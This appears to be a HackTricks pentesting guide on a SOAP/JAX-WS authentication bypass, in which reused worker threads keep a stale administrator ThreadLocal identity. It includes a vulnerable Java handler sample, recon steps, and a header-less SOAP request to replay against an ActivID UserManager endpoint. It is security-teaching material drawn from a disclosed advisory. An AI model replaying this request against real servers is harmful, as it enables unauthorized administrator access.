# SOAP/JAX-WS ThreadLocal Authentication Bypass

{{#include ../banners/hacktricks-training.md}}

## TL;DR

- Some middleware chains store the authenticated `Subject`/`Principal` inside a static `ThreadLocal` and only refresh it when a proprietary SOAP header arrives.
- Because WebLogic/JBoss/GlassFish recycle worker threads, dropping that header causes the last privileged `Subject` processed by the thread to be silently reused.
- Hammer the vulnerable endpoint with header-less but well-formed SOAP bodies until a reused thread grants you the stolen administrator context.

## Root Cause

Handlers similar to the following only overwrite the thread-local identity when the custom header is present, so the previous request's context survives:

```java
public boolean handleMessage(SOAPMessageContext ctx) {
    if (!outbound) {
        SOAPHeader hdr = ctx.getMessage().getSOAPPart().getEnvelope().getHeader();
        SOAPHeaderElement e = findHeader(hdr, subjectName);
        if (e != null) {
            SubjectHolder.setSubject(unmarshal(e));
        }
    }
    return true;
}
```

## Recon

1. Enumerate the reverse proxy / routing rules to locate hidden SOAP trees that may block `?wsdl` yet accept POSTs (map them alongside the flow in [80,443 - Pentesting Web Methodology](../network-services-pentesting/pentesting-web/README.md)).
2. Unpack the EAR/WAR/EJB artifacts (`unzip *.ear`) and inspect `application.xml`, `web.xml`, `@WebService` annotations, and handler chains (e.g., `LoginHandlerChain.xml`) to uncover the handler class, SOAP header QName, and the backing EJB names.
3. If metadata is missing, brute-force likely `ServiceName?wsdl` paths or temporarily relax lab proxies, then import any recovered WSDL into tooling such as [Burp Suite Wsdler](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f) to generate baseline envelopes.
4. Review the handler sources for `ThreadLocal` keepers (e.g., `SubjectHolder.setSubject()`) that are never cleared when the authentication header is missing or malformed.

## Exploitation

1. Send a valid request **with** the proprietary header to learn the normal response codes and any error used for invalid tokens.
2. Resend the same SOAP body while omitting the header. Keep the XML well-formed and respect the required namespaces so the handler exits cleanly.
3. Loop the request; when it lands on a thread that previously executed a privileged action, the reused `Subject` unlocks protected operations such as user or credential managers.

```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
  <soapenv:Header/>
  <soapenv:Body>
    <jax:findUserIds>
      <arg0></arg0>
      <arg1>spl*</arg1>
    </jax:findUserIds>
  </soapenv:Body>
</soapenv:Envelope>
```

## Validating the Bug

- Attach JDWP (`-agentlib:jdwp=transport=dt_socket,server=y,address=5005,suspend=n`) or similar debugging hooks to watch the `ThreadLocal` contents before and after each call, confirming that an unauthenticated request inherited a prior administrator `Subject`.

## References

- [Synacktiv – ActivID administrator account takeover: the story behind HID-PSA-2025-002](https://www.synacktiv.com/publications/activid-administrator-account-takeover-the-story-behind-hid-psa-2025-002.html)
- [PortSwigger – Wsdler (WSDL parser) extension](https://portswigger.net/bappstore/594a49bb233748f2bc80a9eb18a2e08f)

{{#include ../banners/hacktricks-training.md}}
